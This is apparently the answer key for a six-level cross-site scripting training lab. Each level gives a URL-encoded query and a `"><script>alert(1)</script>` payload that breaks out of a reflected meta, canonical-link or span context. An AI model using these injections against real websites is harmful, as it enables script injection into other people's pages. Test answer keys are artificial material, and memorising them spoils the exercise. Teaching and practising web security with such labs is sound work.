# seoctx — solutions

Reflections inside SEO/meta `content=` / `href=` attributes; break attribute and inject new tag.

### seoctx-level1

`/seoctx/level1/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<meta property="og:title" content="...">`

### seoctx-level2

`/seoctx/level2/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<meta name="keywords" content="...">`

### seoctx-level3

`/seoctx/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<meta property="og:description" content="...">`

### seoctx-level4

`/seoctx/level4/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<meta property="og:url" content="...">`

### seoctx-level5

`/seoctx/level5/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<link rel="canonical" href="...">`

### seoctx-level6

`/seoctx/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: dual reflection; body `<span>` is raw HTML
